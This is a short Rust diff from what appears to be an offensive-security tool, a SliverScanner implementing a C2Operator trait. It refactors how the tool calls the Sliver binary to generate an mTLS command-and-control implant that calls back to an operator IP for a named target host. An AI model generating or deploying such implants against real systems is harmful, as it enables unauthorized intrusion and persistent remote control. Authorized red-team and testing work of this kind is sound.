@@ -53,17 +53,15 @@ impl<M: ExecutorMode> C2Operator for SliverScanner<M> {
 
         info!("🔱 V14.1 SOVEREIGN: Generating implant for {} via callback {}", target.host, callback_ip);
 
-        let mut child = Command::new(&self.binary_path);
-        child.arg("generate")
-            .arg("--mtls")
-            .arg(&callback_ip)
-            .arg("--save")
-            .arg(&output_path)
-            .stdin(Stdio::null())
-            .stdout(Stdio::piped())
-            .stderr(Stdio::piped());
+        let args = vec![
+            "generate".to_string(),
+            "--mtls".to_string(),
+            callback_ip.clone(),
+            "--save".to_string(),
+            output_path.clone(),
+        ];
 
-        let output = child.output().await?;
+        let output = self.executor.execute_and_wait(&self.binary_path, args).await?;
         if output.status.success() {
             Ok(output_path)
         } else {
